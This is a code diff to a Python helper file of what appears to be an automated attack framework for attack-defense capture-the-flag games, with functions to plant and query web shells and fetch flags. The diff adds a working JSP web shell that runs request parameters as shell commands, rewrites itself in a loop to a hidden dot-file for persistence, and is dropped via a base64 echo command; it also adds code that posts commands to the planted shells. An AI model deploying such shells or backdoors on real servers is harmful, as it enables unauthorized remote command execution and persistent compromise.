@@ -11,6 +11,7 @@ import readline
 import utils.log
 from random import randint
 import time
+import sys
 
 Log = utils.log.Log() 
 user_agents = open('data/ua.data').readlines()
@@ -40,6 +41,8 @@ def dump_error(e,target="",load_script=""):
     msg = "[error] fail to attack: " + target + " with error: " + str(e) \
     + " with the script: " + load_script
     Log.error(msg)
+    import traceback
+    traceback.print_exc(limit=100, file=sys.stdout)
     write_sys_log(msg)
 
 def dump_warning(e,target="",load_script=""):
@@ -96,7 +99,11 @@ def random_ua():
     return user_agents[rand].strip("\n")
 
 def shell_hash(target,target_port):
-    shell_name = "." + hashlib.md5(shell_salt + target + ":" + target_port).hexdigest() + ".php"
+    if shell_type==1 or shell_type==2:
+        shell_name = "." + hashlib.md5(shell_salt + target + ":" + target_port).hexdigest() + ".php"
+    else:
+        shell_name = "." + hashlib.md5(shell_salt + target + ":" + target_port).hexdigest() + ".jsp"
+
     shell_arg = hashlib.md5(shell_salt_2 + target + ":" + target_port).hexdigest()
     return shell_name,shell_arg
 
@@ -111,15 +118,19 @@ def execute_shell(target,target_port,cmd):
         c_2 = c_2.replace('+','%2B')
         data = "a=" + c_1 + "&" + "b=" + c_2 + "&" + "hash=" + shell_arg
         debug_print("payload => " + data)
-        try:
-            res = http("post",target,target_port,shell_path + "/" +  shell_name ,data,headers)
-        except Exception,e:
-            dump_error(e,target,"function.py execute_shell")
-            # execute shell timeout
-            if 'timed out' in str(e) or 'Connection refused' in str(e):
-                return "timeout"
-            return "error occurs"
-        return res
+    elif shell_type==3:
+        data = shell_arg + "=" + cmd
+        debug_print("payload => " + data)
+    try:
+        res = http("post",target,target_port,shell_path + "/" +  shell_name ,data,headers)
+    except Exception,e:
+        dump_error(e,target,"function.py execute_shell")
+        # execute shell timeout
+        if 'timed out' in str(e) or 'Connection refused' in str(e):
+            return "timeout"
+        return "error occurs"
+    return res
+
 
 def check_shell(target,target_port,cmd):
     shell_name,shell_arg = shell_hash(target,target_port)
@@ -180,10 +191,12 @@ def generate_shell(target,target_port,cmd,shell_type=2):
         usleep(5);
         }}
         ?>"""%(shell_name,shell_arg)
+    if shell_type==3:
+        shell = """<% int i=2;while(i>1){new java.io.FileOutputStream("/{{shell_path}}").write("<% java.io.InputStream input = Runtime.getRuntime().exec(new String[] {\\"sh\\",\\"-c\\",request.getParameter(\\"{{shell_arg}}\\")}).getInputStream();int len = -1;byte[] bytes = new byte[4092];while ((len = input.read(bytes)) != -1) {out.println(new String(bytes, \\"GBK\\"));}%\>".getBytes());Thread.sleep(100);}%>""".replace("{{shell_path}}",shell_absolute_path+'/'+shell_name).replace("{{shell_arg}}",shell_arg)
     return shell_name,shell,base64.b64encode(shell)
 
 def get_shell(target,target_port,cmd):
-    shell_name,shell,encode_shell = generate_shell(target,target_port,cmd)
+    shell_name,shell,encode_shell = generate_shell(target,target_port,cmd,shell_type)
     return  "/bin/echo " + encode_shell + " | /usr/bin/base64 -d | /bin/cat > " + shell_absolute_path + "/" + shell_name 
 
 def get_flag(target,target_port,cmd):
